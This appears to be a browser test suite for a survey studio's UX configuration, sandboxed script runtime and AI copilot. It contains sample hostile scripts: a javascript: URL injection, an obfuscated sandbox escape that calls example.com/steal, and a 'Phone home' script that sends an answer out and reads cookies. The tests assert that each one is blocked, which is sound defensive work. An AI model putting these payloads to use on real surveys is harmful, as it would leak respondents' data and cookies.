/**
 * INTELLIGENT MODE — ADVANCED UX, CSS & JAVASCRIPT (the UX brief), in the browser.
 *
 *   node scripts/ux-copilot-test.mjs      (studio :3000 with AI_API_URL=fake:, runtime :3001)
 *
 * RUNTIME — the survey's `ux` configuration on the real respondent runtime:
 *   scoped styles (only the target, only this survey), states, phone rules,
 *   animations (on select, staggered, between pages), declarative behaviours
 *   (fire / hold / release), and a script behaviour in its sandbox — which
 *   cannot reach the page, the network or anything but the `rs` api.
 * STUDIO — the copilot: a look-only request refuses structure and proves it,
 *   the Changes panel previews the real components with the proposed UX, the
 *   code is shown, Apply is one undoable change, the UX tab reviews and
 *   removes, "make it slower" modifies instead of adding.
 * The fake provider cannot reason, so the suite supplies the model's reply
 * (window.__rescriptCopilotFake); everything after the model is real.
 */
import assert from "node:assert/strict";
import { chromium } from "/home/claude/.npm-global/lib/node_modules/playwright/index.mjs";
import { openPreview } from "./lib/preview.mjs";
import { openTab, switchMode } from "./lib/nav.mjs";
import { SurveyDefinition } from "../packages/schema/dist/index.js";
import { applySurveyActions, coerceSurveyActions } from "../packages/engine/dist/index.js";

const STUDIO = process.env.STUDIO_URL ?? "http://localhost:3000";
const RUNTIME = process.env.RUNTIME_URL ?? "http://localhost:3001";
let passed = 0;
const ok = (msg) => { passed++; console.log(`  ok   ${msg}`); };

/* ------------------------------------------------------------ a survey with a UX configuration */
let n = 0;
const ids = (p) => `${p}_${++n}`;
const build = (actions, base) => {
  const c = coerceSurveyActions(actions);
  assert.deepEqual(c.rejected, [], JSON.stringify(c.rejected));
  const r = applySurveyActions(base, c.actions, { ids });
  assert.deepEqual(r.errors, [], r.errors.join("\n"));
  return r.def;
};
const structure = build([
  { op: "create_block", title: "Brand" },
  { op: "create_question", ref: "FAV", type: "single", text: "Which brand do you prefer?", options: ["Alpha", "Beta", "Gamma", { label: "Other", other: true }] },
  { op: "create_question", ref: "OTHERQ", type: "single", text: "Which colour do you like?", options: ["Red", "Blue"] },
  { op: "create_block", title: "Detail" },
  { op: "create_question", ref: "WHY", type: "long_text", text: "Why?" },
], SurveyDefinition.parse({ meta: { id: "ux-srv", code: "S", title: "UX" }, questions: [], flow: [{ type: "end", id: "e_ok", status: "complete" }] }));
const otherCode = String(structure.questions[0].options.find((o) => o.label === "Other").code);
const withUx = build([
  { op: "create_style", label: "Q1 cards", target: "Q1.options", rules: [
    { declarations: { "border-radius": "14px", padding: "14px 16px", transition: "transform .15s" } },
    { state: "hover", declarations: { transform: "translateY(-2px)" } },
    { state: "selected", declarations: { "border-color": "rgb(255, 0, 128)", "border-width": "2px", "border-style": "solid" } },
    { media: "mobile", declarations: { width: "100%" } },
  ] },
  { op: "create_animation", label: "Pop on select", target: "Q1.options", preset: "pop", trigger: "select", duration: 250 },
  { op: "create_animation", label: "Brand one at a time", target: "block:Brand.questions", preset: "fade-up", stagger: 150 },
  { op: "create_animation", label: "Page transition", target: "survey", preset: "fade-in", trigger: "page_enter", duration: 300 },
  { op: "create_behavior", label: "Nudge Next", target: "Q1", on: "answer", effects: [{ do: "animate", target: "next", preset: "pulse", duration: 2000 }] },
  { op: "create_behavior", label: "Other message", target: "Q1", on: "select_option", options: ["Other"], effects: [{ do: "show_message", text: "Tell us which brand in the box." }, { do: "add_class", className: "chose-other" }] },
  { op: "create_style", label: "Chosen other", target: "Q1", rules: [{ whenClass: "chose-other", declarations: { "outline-color": "rgb(0, 128, 0)", "outline-style": "solid", "outline-width": "3px" } }] },
  { op: "create_behavior", label: "Script: mark picks", target: "Q2", script: `rs.listen("select", "self", (e) => { rs.addClass("self", "picked-" + e.option); rs.setStyle("Q2.title", { color: "rgb(1, 2, 3)" }); rs.setStyle("Q2.title", { background: "url(javascript:alert(1))" }); });` },
], structure);
assert.equal(withUx.ux.styles.length, 2); assert.equal(withUx.ux.behaviors.length, 3);

const browser = await chromium.launch();
const q1 = withUx.questions[0].id, q2 = withUx.questions[1].id;
{
  const requests = [];
  const pv = await openPreview(browser, RUNTIME, { definition: withUx }, { viewport: { width: 1200, height: 1000 } });
  pv.on("request", (r) => requests.push(r.url()));
  const shell = await pv.$eval(".rs-shell", (e) => ({ ux: e.dataset.rsUx, block: e.dataset.rsBlock, page: e.dataset.rsPage }));
  assert.equal(shell.ux, "ux-srv"); assert.ok(shell.block && shell.page);
  assert.ok(await pv.$("style[data-rs-ux-css]"), "the compiled stylesheet");
  const radius = (qid) => pv.$eval(`[data-rs-el="question"][data-rs-id="${qid}"] [data-rs-el="option"]`, (e) => getComputedStyle(e).borderTopLeftRadius);
  assert.equal(await radius(q1), "14px");
  assert.notEqual(await radius(q2), "14px", "scoped: the other question's options are untouched");
  const cssText = await pv.$eval("style[data-rs-ux-css]", (e) => e.textContent);
  assert.ok(!/(^|})\s*(html|body|:root)\b/.test(cssText) && cssText.split("}").filter((r) => r.includes("{") && !r.trim().startsWith("@") && !/^\s*(from|to|\d+%)/.test(r.split("{").pop() ?? "")).every((r) => /\[data-rs-ux="ux-srv"\]|^\s*$|@keyframes|^\s*(from|to|\d+%)/.test(r)), "every rule is under the survey's own attribute");
  ok("scoped styles: the compiled stylesheet reaches Q1's options (14px cards) and nothing else — the survey shell names its survey, block and page");

  // stagger: the Brand questions numbered in order
  assert.deepEqual(await pv.$$eval('[data-rs-el="question"]', (qs) => qs.map((q) => q.style.getPropertyValue("--rs-ux-i"))), ["0", "1"]);
  const anim = await pv.$eval(`[data-rs-el="question"][data-rs-id="${q2}"]`, (e) => ({ name: getComputedStyle(e).animationName, delay: getComputedStyle(e).animationDelay }));
  assert.equal(anim.name, "rs-ux-fade-up"); assert.equal(anim.delay, "0.15s", "the second question starts 150ms after the first");
  // hover
  const opt = `[data-rs-el="question"][data-rs-id="${q1}"] [data-rs-el="option"]`;
  await pv.hover(`${opt} >> nth=1`);
  await pv.waitForTimeout(250);
  assert.notEqual(await pv.$eval(`${opt}:nth-of-type(2)`, (e) => getComputedStyle(e).transform), "none", "hover lifts the card");
  // select: selected-state style + the pop, and the behaviour animates Next
  await pv.click(`${opt} >> nth=0`);
  await pv.waitForTimeout(80);
  const first = await pv.$(`${opt} >> nth=0`);
  assert.equal(await first.evaluate((e) => getComputedStyle(e).borderTopColor), "rgb(255, 0, 128)");
  assert.equal(await first.evaluate((e) => getComputedStyle(e).animationName), "rs-ux-pop");
  assert.ok(await pv.$eval('[data-rs-button="next"]', (b) => b.getAnimations().length > 0), "answering Q1 pulses the Next button");
  assert.equal(await pv.$eval(`[data-rs-el="question"][data-rs-id="${q1}"]`, (e) => e.hasAttribute("data-rs-ux-answered")), true);
  ok("states and animations: hover lifts, selected restyles and pops, the Brand questions fade up one at a time (stagger), answering Q1 pulses Next (a behaviour)");

  // hold / release: Other → message + class; another option → both undone
  await pv.click(`${opt}[data-rs-id="${otherCode}"]`);
  await pv.waitForSelector('.rs-ux-message');
  assert.equal(await pv.textContent(".rs-ux-message"), "Tell us which brand in the box.");
  assert.equal(await pv.$eval(`[data-rs-el="question"][data-rs-id="${q1}"]`, (e) => getComputedStyle(e).outlineColor), "rgb(0, 128, 0)", "a whenClass rule applies while the class is on");
  await pv.click(`${opt} >> nth=1`);
  await pv.waitForTimeout(80);
  assert.equal(!!(await pv.$(".rs-ux-message")), false, "released: the message goes");
  assert.equal(await pv.$eval(`[data-rs-el="question"][data-rs-id="${q1}"]`, (e) => e.getAttribute("data-rs-ux-on") ?? ""), "");
  // the class survives a React re-render of the card (it is not in className)
  await pv.click(`${opt}[data-rs-id="${otherCode}"]`);
  await pv.fill('[data-testid="rs-other-input"]', "Delta");
  await pv.waitForTimeout(80);
  assert.match(await pv.$eval(`[data-rs-el="question"][data-rs-id="${q1}"]`, (e) => e.getAttribute("data-rs-ux-on") ?? ""), /chose-other/, "held through re-renders");
  ok("held behaviours: choosing Other shows the message and marks the card; choosing another option undoes both; the mark survives React re-rendering the card");

  // the sandboxed script
  const frame = await pv.$('iframe[data-rs-ux-sandbox]');
  assert.equal(await frame.getAttribute("sandbox"), "allow-scripts", "an opaque origin: no same-origin, no forms, no popups, no top navigation");
  await pv.click(`[data-rs-el="question"][data-rs-id="${q2}"] [data-rs-el="option"] >> nth=1`);
  await pv.waitForFunction((id) => (document.querySelector(`[data-rs-el="question"][data-rs-id="${id}"]`)?.getAttribute("data-rs-ux-on") ?? "").includes("picked-2"), q2, { timeout: 5000 });
  const title = await pv.$eval(`[data-rs-el="question"][data-rs-id="${q2}"] .rs-qtext`, (e) => ({ color: getComputedStyle(e).color, bg: e.style.background }));
  assert.equal(title.color, "rgb(1, 2, 3)", "rs.setStyle through the CSS gate");
  assert.equal(title.bg, "", "…and a javascript: url refused by it");
  ok("a script behaviour runs in a sandboxed frame and changes the survey only through the rs api (addClass, setStyle — gated)");

  // a script that tries to escape: page, network, storage, flood
  const escape = structuredClone(withUx);
  // it passes the static gate by spelling everything through strings — exactly what the sandbox is for
  escape.ux.behaviors = [
    { id: "evil", label: "Escape attempt", target: { kind: "question", questionId: q1 }, effects: [], script: `
      const w = (() => this)();
      try { w["par" + "ent"]["docu" + "ment"].title = "pwned"; rs.log("page OPEN"); } catch (e) { rs.log("page blocked: " + e.name); }
      try { w["local" + "Storage"].setItem("x", "1"); rs.log("storage OPEN"); } catch (e) { rs.log("storage blocked: " + e.name); }
      try { w["fe" + "tch"]("https://example.com/steal").then(() => rs.log("network OPEN"), () => rs.log("network blocked")); } catch (e) { rs.log("network blocked"); }
      try { const I = w["Ima" + "ge"]; const img = new I(); img.src = "https://example.com/pixel"; } catch (e) {}` },
    { id: "flood", label: "Flood", target: { kind: "question", questionId: q1 }, effects: [], script: `const flood = () => { [...Array(60)].forEach(() => rs.addClass("self", "x")); rs.after(0, flood); }; flood();` },
    { id: "loop", label: "Loop", target: { kind: "question", questionId: q1 }, effects: [], script: `while (true) {}` },
  ];
  const ev = await openPreview(browser, RUNTIME, { definition: escape }, { viewport: { width: 1200, height: 1000 } });
  const evReq = [];
  ev.on("request", (r) => evReq.push(r.url()));
  await ev.waitForTimeout(2500);
  assert.notEqual(await ev.title(), "pwned");
  assert.equal(evReq.filter((u) => u.includes("example.com")).length, 0, "no request left the sandbox");
  assert.equal(!!(await ev.$('iframe[data-rs-ux-sandbox="flood"]')), false, "a script flooding commands is stopped and its frame removed");
  assert.ok(!!(await ev.$('iframe[data-rs-ux-sandbox="evil"]')), "the escape attempt ran — in its frame");
  assert.equal(!!(await ev.$('iframe[data-rs-ux-sandbox="loop"]')), false, "a script that fails the gate (a loop) never runs");
  assert.equal(await ev.evaluate(() => localStorage.getItem("x")), null, "the page's storage untouched");
  await ev.close();
  ok("the sandbox holds: a script cannot touch the page, storage or the network, and one that floods the api is stopped");

  // pages: the transition plays on the next page, Brand's styles stay on Brand
  await pv.click('[data-testid="rs-next"]');
  await pv.waitForFunction(() => document.querySelector(".rs-shell")?.dataset.rsBlock && document.querySelector('[data-rs-el="question"] textarea'), null, { timeout: 8000 });
  assert.notEqual(await pv.$eval(".rs-shell", (e) => e.dataset.rsBlock), shell.block, "the shell names the new block");
  assert.match(await pv.$eval("#rs-questions", (e) => e.getAttribute("data-rs-ux-play") ?? ""), /uxa_\d+/, "the page transition replays on the new page");
  assert.equal(await pv.$eval("#rs-questions", (e) => getComputedStyle(e).animationName), "rs-ux-fade-in");
  assert.equal(!!(await pv.$('iframe[data-rs-ux-sandbox]')), false, "Q2's script runs only on the page that shows Q2");
  assert.equal(requests.filter((u) => u.includes("example.com")).length, 0);
  await pv.close();
  ok("between pages: the page transition replays, the shell names the new block, and page-scoped state starts fresh");
}
{
  // phone width: the mobile rule
  const pv = await openPreview(browser, RUNTIME, { definition: withUx }, { viewport: { width: 390, height: 900 } });
  const w = await pv.$eval(`[data-rs-el="question"][data-rs-id="${q1}"] [data-rs-el="option"]`, (e) => [e.getBoundingClientRect().width, e.parentElement.getBoundingClientRect().width]);
  assert.ok(Math.abs(w[0] - w[1]) < 2, `mobile: one option per row (${w})`);
  await pv.close();
  // no UX: nothing changes
  const plain = await openPreview(browser, RUNTIME, { definition: structure }, { viewport: { width: 1200, height: 1000 } });
  assert.equal(await plain.$eval(".rs-shell", (e) => e.hasAttribute("data-rs-ux")), false);
  assert.equal(!!(await plain.$("style[data-rs-ux-css]")), false);
  await plain.close();
  ok("the mobile rule stacks the options at phone width; a survey with no UX configuration renders exactly as before (no attribute, no stylesheet, no layer)");
}

/* ------------------------------------------------------------ the copilot */
const context = await browser.newContext({ viewport: { width: 1600, height: 1000 } });
const page = await context.newPage();
const pageErrors = [];
page.on("pageerror", (e) => pageErrors.push(String(e)));
page.on("console", (m) => { if (m.type() === "error" && !/401|402|422|501|Failed to load resource|ERR_TUNNEL/.test(m.text())) pageErrors.push(m.text().slice(0, 300)); });
const goTab = async (name) => { await openTab(page, name); await page.waitForTimeout(150); };
const loadDef = async (def) => {
  await goTab("JSON");
  await page.waitForSelector("textarea.code");
  await page.click('button:has-text("edit")');
  await page.$eval("textarea.code", (el, v) => { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(el, v); el.dispatchEvent(new Event("input", { bubbles: true })); }, JSON.stringify(def));
  await page.click('button:has-text("validate & apply")');
  await page.waitForTimeout(800);
  await goTab("Questions");
};
const readDef = async () => {
  await goTab("JSON");
  await page.waitForSelector("textarea.code");
  const json = await page.$eval("textarea.code", (e) => e.value);
  await goTab("Questions");
  await switchMode(page, "intelligent");
  await page.waitForSelector('[data-testid="intelligent-view"]');
  return JSON.parse(json);
};
const turns = () => page.$$('[data-testid="cp-turn"]');
const say = async (text, reply) => {
  if (reply) await page.evaluate((r) => window.__rescriptCopilotFake(r), reply);
  const k = (await turns()).length;
  await page.fill('[data-testid="iq-input"]', text);
  await page.keyboard.press("Enter");
  await page.waitForFunction((c) => { const t = document.querySelectorAll('[data-testid="cp-turn"]'); return t.length > c && t[t.length - 1].getAttribute("data-status") !== "thinking"; }, k, { timeout: 30000 });
  return (await turns()).at(-1);
};
const texts = (sel) => page.$$eval(sel, (els) => els.map((e) => e.textContent.replace(/\s+/g, " ").trim()));

const sandboxDef = { ...structuredClone(structure), meta: { ...structure.meta, id: "sandbox" }, deployment: { clientSlug: "c", studySlug: "s" } };
await page.goto(`${STUDIO}/sandbox?mode=studio`, { waitUntil: "networkidle" });
await page.waitForSelector(".block-badge");
await loadDef(sandboxDef);
await switchMode(page, "intelligent");
await page.waitForSelector('[data-testid="intelligent-view"]');
const before = await readDef();

const UX_REPLY = {
  kind: "proposal",
  reply: "I'll make UX-only changes to Q1: card-style options with a hover lift, a short pop when one is selected, and a smooth expand for the Other text box. The question, its codes and its logic stay exactly as they are.",
  actions: [
    { op: "create_style", ref: "CARDS", label: "Q1 option cards", target: "Q1.options", rules: [
      { declarations: { "border-radius": "16px", padding: "14px 16px", "box-shadow": "0 1px 3px rgba(0,0,0,.12)" } },
      { state: "hover", declarations: { transform: "translateY(-2px)" } },
      { state: "selected", declarations: { "border-color": "rgb(255, 0, 128)" } },
      { selector: "input[type=radio]", declarations: { position: "absolute", opacity: "0" } },
    ] },
    { op: "create_animation", label: "Card pop", target: "Q1.options", preset: "pop", trigger: "select", duration: 220 },
    { op: "create_animation", label: "Other expands", target: "Q1.other", preset: "expand", trigger: "appear", duration: 300 },
    { op: "create_behavior", label: "Other hint", target: "Q1", on: "select_option", options: ["Other"], effects: [{ do: "show_message", text: "Which brand? Type it below." }] },
    { op: "update_question", target: "Q1", text: "Sneaky rewording" },
  ],
};
{
  const t = await say("For Q1, make the answer options look like modern cards. When someone selects an option, animate the card slightly. If they select Other, smoothly expand the text field. Don't change any survey logic.", UX_REPLY);
  assert.equal(await t.getAttribute("data-mode"), "ux", "the server read it as a UX request");
  assert.ok(await t.$('[data-testid="cp-ux-only-turn"]'), "look-only, said on the card");
  assert.equal(await page.getAttribute('[data-testid="cp-panel"]', "data-tab"), "changes");
  const refused = await page.textContent('[data-testid="cp-refused"]');
  assert.match(refused, /Change Q1: this request is about the look and behaviour only/, "the sneaky rewording is refused");
  assert.match(await page.textContent('[data-testid="cp-ux-structure-ok"]'), /UX only — the survey's questions, options, codes, logic and validation are unchanged/);
  const items = await texts('[data-testid="cp-ux-items"] li');
  assert.ok(items.some((l) => /Style “Q1 option cards” on Q1 options \(4 rules\)/.test(l)), items.join("\n"));
  assert.ok(items.some((l) => /Animate Q1 options: pop on select, 220ms/.test(l)));
  assert.ok(items.some((l) => /when option \d+ is selected on Q1 → show “Which brand\? Type it below\.”/.test(l)), items.join("\n"));
  assert.equal(!!(await page.$('[data-testid="cp-destructive"]')), false, "adding UX removes nothing");
  // the preview: the real Q1 with the proposed UX
  await page.waitForSelector('[data-testid="cp-ux-shell"] [data-rs-el="option"]');
  const pr = '[data-testid="cp-ux-shell"] [data-rs-el="option"]';
  assert.equal(await page.$eval(pr, (e) => getComputedStyle(e).borderTopLeftRadius), "16px");
  await page.click(`${pr}[data-rs-id="${otherCode}"]`);
  await page.waitForSelector('[data-testid="cp-ux-shell"] .rs-ux-message');
  assert.equal(await page.textContent('[data-testid="cp-ux-shell"] .rs-ux-message'), "Which brand? Type it below.");
  assert.equal(await page.$eval('[data-testid="cp-ux-shell"] .rs-other-input', (e) => getComputedStyle(e).animationName), "rs-ux-expand", "the Other box expands");
  await page.click('[data-testid="cp-ux-before"]');
  await page.waitForTimeout(100);
  assert.notEqual(await page.$eval(pr, (e) => getComputedStyle(e).borderTopLeftRadius), "16px", "Before: the survey as it is now");
  await page.click('[data-testid="cp-ux-after"]');
  await page.click('[data-testid="cp-ux-mobile"]');
  assert.equal(await page.getAttribute('[data-testid="cp-ux-preview"]', "data-device"), "mobile");
  // the code
  await page.click('[data-testid="cp-ux-code"] summary');
  const code = await page.textContent('[data-testid="cp-ux-code"]');
  assert.match(code, /\[data-rs-ux="sandbox"\] \[data-rs-el="question"\]\[data-rs-id="[^"]+"\] \[data-rs-el="option"\]/);
  assert.match(code, /prefers-reduced-motion: no-preference/);
  ok("a look-only request: the rewording is refused, the structure is proven unchanged, each item is explained, the real Q1 is previewed with the proposed UX (after / before / phone), the scoped code is shown");
}
{
  await page.click('[data-testid="cp-panel-apply"]');
  await page.waitForSelector('[data-testid="cp-applied-note"]');
  assert.match(await page.textContent('[data-testid="cp-applied-note"]'), /Done\. The look and behaviour of Q1 options, Q1 other text, Q1 have been updated without changing the survey's questions, codes or logic\./);
  const d = await readDef();
  assert.equal(d.ux.styles.length, 1); assert.equal(d.ux.animations.length, 2); assert.equal(d.ux.behaviors.length, 1);
  assert.deepEqual(d.questions, before.questions, "no question changed");
  assert.deepEqual(d.flow, before.flow, "no flow changed");
  await page.click('[data-testid="cp-tab-history"]');
  const hist = await page.textContent('[data-testid="cp-change"]');
  assert.match(hist, /Created.*style “Q1 option cards” \(Q1 options\).*animation “Card pop”/s);
  ok("Apply: one change, the UX saved in the survey's definition (so preview, test, publish, export and duplicate carry it), questions and flow byte-identical, listed in the AI change history");
}
{
  // modify the existing instead of adding
  const d = await readDef();
  const pop = d.ux.animations.find((a) => a.label === "Card pop");
  const t = await say("Make the existing card animation slower", { kind: "proposal", reply: `I'll slow the existing pop (${pop.id}) from 220ms to 600ms rather than adding a second animation.`, actions: [{ op: "update_animation", id: pop.id, duration: 600 }] });
  assert.equal(await t.getAttribute("data-mode"), "ux");
  assert.ok((await texts('[data-testid="cp-ux-items"] li')).includes("Change animation “Card pop”: 220ms → 600ms"));
  await page.click('[data-testid="cp-panel-apply"]');
  await page.waitForTimeout(300);
  const d2 = await readDef();
  assert.equal(d2.ux.animations.length, 2, "still two: modified, not duplicated");
  assert.equal(d2.ux.animations.find((a) => a.id === pop.id).durationMs, 600);
  ok("“make the existing animation slower” changes that animation (220ms → 600ms) instead of adding a competing one");
}
{
  // JavaScript: a safe script proposal, and one the gate refuses
  const t = await say("Add JavaScript: when someone selects an option in Q2, mark the card", { kind: "proposal", reply: "I'll add a sandboxed script to Q2.", actions: [
    { op: "create_behavior", label: "Mark Q2 picks", target: "Q2", script: `rs.listen("select", "self", (e) => rs.addClass("self", "picked"));` },
    { op: "create_behavior", label: "Phone home", target: "Q2", script: `fetch("https://example.com/?a=" + rs.getAnswer("Q1")); document.cookie;` },
  ] });
  assert.equal(await t.getAttribute("data-mode"), "ux");
  const refused = await page.textContent('[data-testid="cp-refused"]');
  assert.match(refused, /fetch is not available to survey scripts/); assert.match(refused, /document is not available/);
  await page.click('[data-testid="cp-ux-code"] summary');
  assert.match(await page.textContent('[data-testid="cp-ux-code"]'), /js · sandboxed[\s\S]*rs\.listen\("select", "self"/);
  await page.waitForSelector('[data-testid="cp-ux-shell"] iframe[data-rs-ux-sandbox]', { state: "attached" });
  await page.click('[data-testid="cp-ux-shell"] [data-rs-el="option"] >> nth=0');
  await page.waitForFunction(() => (document.querySelector('[data-testid="cp-ux-shell"] [data-rs-el="question"]')?.getAttribute("data-rs-ux-on") ?? "").includes("picked"), null, { timeout: 5000 });
  await page.click('[data-testid="cp-panel-cancel"]');
  ok("JavaScript on request: the sandboxed script is previewed working; one that reaches for the network or the page is refused, with the reason");
}
{
  // the UX tab: what the survey has, the UX review, removal through a proposal
  await page.click('[data-testid="cp-tab-ux"]');
  assert.deepEqual(await page.$$eval('[data-testid="cp-ux-row"]', (rs) => rs.map((r) => r.dataset.kind)), ["style", "animation", "animation", "behaviour"]);
  await page.click('[data-testid="cp-ux-remove"] >> nth=3');
  assert.equal(await page.getAttribute('[data-testid="cp-panel"]', "data-tab"), "changes");
  assert.match(await page.textContent('[data-testid="cp-destructive"]'), /Removes the behaviour “Other hint”/);
  assert.ok(await page.$eval('[data-testid="cp-panel-apply"]', (b) => b.disabled), "a removal waits for confirmation");
  await page.click('[data-testid="cp-confirm"]');
  await page.click('[data-testid="cp-panel-apply"]');
  await page.waitForTimeout(300);
  assert.equal((await readDef()).ux.behaviors.length, 0);
  // a conflict found by the review
  const t = await say("Also give the Q1 cards a smaller radius", { kind: "proposal", reply: "Adding a second card style.", actions: [{ op: "create_style", label: "Smaller radius", target: "Q1.options", declarations: { "border-radius": "6px" } }] });
  await page.click('[data-testid="cp-panel-apply"]');
  await page.waitForTimeout(300);
  await page.click('[data-testid="cp-tab-ux"]');
  const findings = await texts('[data-testid="cp-ux-finding"]');
  assert.ok(findings.some((f) => /“Q1 option cards” and “Smaller radius” both set border-radius on Q1 options \(16px vs 6px\)/.test(f)), findings.join("\n"));
  ok("the UX tab lists the survey's styles, animations and behaviours, finds conflicts, and removes through a confirmed, undoable proposal");
}
{
  // undo the whole look
  await page.click('[data-testid="cp-tab-history"]');
  const undo = await page.$$('[data-testid="cp-undo-change"]');
  for (let i = 0; i < undo.length; i++) { const b = (await page.$$('[data-testid="cp-undo-change"]'))[0]; if (!b) break; await b.click(); await page.waitForTimeout(150); const warn = await page.$('[data-testid="cp-revert-anyway"]'); if (warn) { await warn.click(); await page.waitForTimeout(150); } }
  const d = await readDef();
  assert.ok(!d.ux || d.ux.styles.length + d.ux.animations.length + d.ux.behaviors.length === 0, JSON.stringify(d.ux));
  assert.deepEqual(d.questions, before.questions);
  ok("every AI UX change undoes as one operation, back to the survey as it was");
}
assert.deepEqual(pageErrors, [], pageErrors.join("\n"));
await browser.close();
console.log(`\n${passed} passed`);
